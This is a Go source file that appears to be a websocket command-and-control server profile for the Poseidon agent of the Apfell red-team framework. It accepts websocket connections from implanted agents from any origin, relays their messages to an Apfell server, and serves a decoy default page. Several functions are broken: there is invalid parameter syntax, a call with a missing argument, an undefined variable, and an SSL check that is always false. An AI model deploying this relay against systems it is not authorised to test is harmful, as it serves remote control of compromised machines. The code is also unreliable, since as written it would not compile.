// +build websocket

package servers

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kabukky/httpscerts"
)

type WebsocketC2 struct {
	PollInterval int
	BaseURL      string
	BindAddress  string
	SSL          bool
	SocketURI    string
	Defaultpage  string
	Logfile      string
	Debug        bool
}

var logger *log.Logger
var upgrader = websocket.Upgrader{}

func newServer() Server {
	return &WebsocketC2{}
}

func (s *WebsocketC2) SetBindAddress(addr string) {
	s.BindAddress = addr
}

//PollingInterval - Returns the polling interval
func (s WebsocketC2) PollingInterval() int {
	return s.PollInterval
}

//SetPollingInterval - Sets the polling interval
func (s *WebsocketC2) SetPollingInterval(interval int) {
	s.PollInterval = interval
}

//ApfellBaseURL - Returns the base url for apfell
func (s WebsocketC2) ApfellBaseURL() string {
	return s.BaseURL
}

//SetApfellBaseURL - Sets the base url for apfell
func (s *WebsocketC2) SetApfellBaseURL(url string) {
	s.BaseURL = url
}

//SetSocketURI - Set socket uri
func (s *WebsocketC2) SetSocketURI(uri string) {
	s.SocketURI = uri
}

func (s *WebsocketC2) PostMessage([]byte msg) []byte {
	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
	return s.htmlPostData(urlEnding, msg)
}

func (s WebsocketC2) GetNextTask(apfellID string) []byte {
	//place holder
	url := fmt.Sprintf("%sapi/v%s/agent_message", s.ApfellBaseURL(), ApiVersion)
	return s.htmlPostData(url)
}

func (s WebsocketC2) PostResponse(taskid string, output []byte) []byte {
	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
	return output
}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (s *WebsocketC2) postRESTResponse(urlEnding string, data []byte) []byte {
	

	return data
}

//htmlPostData HTTP POST function
func (s *WebsocketC2) htmlPostData(urlEnding string, sendData []byte) []byte {
	url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), urlEnding)
	//log.Println("Sending POST request to url: ", url)
	s.Websocketlog(fmt.Sprintln("Sending POST request to: ", url))

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error sending POST request: %s", err.Error()))
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		s.Websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error reading response body: %s", err.Error()))
		return make([]byte, 0)
	}

	return body
}

//htmlGetData - HTTP GET request for data
func (s *WebsocketC2) htmlGetData(url string) []byte {
	//log.Println("Sending HTML GET request to url: ", url)
	client := &http.Client{}
	var respBody []byte

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error creating http request: %s", err.Error()))
		return make([]byte, 0)
	}

	resp, err := client.Do(req)

	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error completing GET request: %s", err.Error()))
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		s.Websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	respBody, _ = ioutil.ReadAll(resp.Body)

	return respBody

}

func (s *WebsocketC2) SetDebug(debug bool) {
	s.Debug = debug
}

//GetDefaultPage - Get the default html page
func (s WebsocketC2) GetDefaultPage() string {
	return s.Defaultpage
}

//SetDefaultPage - Set the default html page
func (s *WebsocketC2) SetDefaultPage(newpage string) {
	s.Defaultpage = newpage
}

//SocketHandler - Websockets handler
func (s WebsocketC2) SocketHandler(w http.ResponseWriter, r *http.Request) {
	//Upgrade the websocket connection
	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		s.Websocketlog(fmt.Sprintf("Websocket upgrade failed: %s\n", err.Error()))
		http.Error(w, "websocket connection failed", http.StatusBadRequest)
		return
	}

	s.Websocketlog("Received new websocket client")

	go s.manageClient(conn)

}

func (s *WebsocketC2) manageClient(c *websocket.Conn) {

LOOP:
	for {
		// Wait for the client to send the initial checkin message
		time.Sleep(time.Duration(s.PollingInterval()) * time.Second)
		m := Message{}
		err := c.ReadJSON(&m)

		if err != nil {
			s.Websocketlog(fmt.Sprintf("Read error %s. Exiting session", err.Error()))
			return
		}

		var resp []byte
		if m.Client {
			s.Websocketlog(fmt.Sprintf("Received agent message %+v\n", m))
			resp = s.PostMessage([]byte(m.Data))
		}
		

		reply := Message{Client: false}

		if len(resp) == 0 {
			reply.Data = string(make([]byte, 1))
		} else {
			reply.Data = string(resp)
		}

		reply.Tag = m.Tag


		if err = c.WriteJSON(re); err != nil {
			s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
			break LOOP
		}
		
	}

	c.Close()

}

//ServeDefaultPage - HTTP handler
func (s WebsocketC2) ServeDefaultPage(w http.ResponseWriter, r *http.Request) {
	log.Println("Received request: ", r.URL)
	log.Println("URI Path ", r.URL.Path)
	if (r.URL.Path == "/" || r.URL.Path == "/index.html") && r.Method == "GET" {
		// Serve the default page if we receive a GET request at the base URI
		http.ServeFile(w, r, s.GetDefaultPage())
	}

	http.Error(w, "Not Found", http.StatusNotFound)
	return
}

//Run - main function for the websocket profile
func (s WebsocketC2) Run(config interface{}) {
	cf := config.(C2Config)
	if cf.Debug {
		f, err := os.Create(cf.Logfile)
		if err != nil {
			log.Println("Failed to create log file for websockets server")
			return
		}

		logger = log.New(f, "poseidon-websocket: ", log.Lshortfile|log.LstdFlags)
	}

	s.SetDefaultPage(cf.Defaultpage)
	s.SetApfellBaseURL(cf.BaseURL)
	s.SetBindAddress(cf.BindAddress)
	s.SetSocketURI(cf.SocketURI)

	// Handle requests to the base uri
	http.HandleFunc("/", s.ServeDefaultPage)
	// Handle requests to the websockets uri
	http.HandleFunc(fmt.Sprintf("/%s", s.SocketURI), s.SocketHandler)

	// Setup all of the options according to the configuration
	if !strings.Contains(cf.SSLKey, "") && !strings.Contains(cf.SSLCert, "") {

		// copy the key and cert to the local directory
		keyfile, err := ioutil.ReadFile(cf.SSLKey)
		if err != nil {
			log.Println("Unable to read key file ", err.Error())
		}

		err = ioutil.WriteFile("key.pem", keyfile, 0644)
		if err != nil {
			log.Println("Unable to write key file ", err.Error())
		}

		certfile, err := ioutil.ReadFile(cf.SSLCert)
		if err != nil {
			log.Println("Unable to read cert file ", err.Error())
		}

		err = ioutil.WriteFile("cert.pem", certfile, 0644)
		if err != nil {
			log.Println("Unable to write cert file ", err.Error())
		}
	}

	if cf.UseSSL {
		err := httpscerts.Check("cert.pem", "key.pem")
		if err != nil {
			s.Websocketlog(fmt.Sprintf("Error for cert.pem or key.pem %s", err.Error()))
			err = httpscerts.Generate("cert.pem", "key.pem", cf.BindAddress)
			if err != nil {
				log.Fatal("Error generating https cert")
				os.Exit(1)
			}
		}

		s.Websocketlog(fmt.Sprintf("Starting SSL server at https://%s and wss://%s", cf.BindAddress, cf.BindAddress))
		err = http.ListenAndServeTLS(cf.BindAddress, "cert.pem", "key.pem", nil)
		if err != nil {
			log.Fatal("Failed to start raven server: ", err)
		}
	} else {
		s.Websocketlog(fmt.Sprintf("Starting server at http://%s and ws://%s", cf.BindAddress, cf.BindAddress))
		err := http.ListenAndServe(cf.BindAddress, nil)
		if err != nil {
			log.Fatal("Failed to start raven server: ", err)
		}
	}
}

//Websocketlog - logging function
func (s WebsocketC2) Websocketlog(msg string) {
	if logger != nil {
		logger.Println(msg)
	}
}
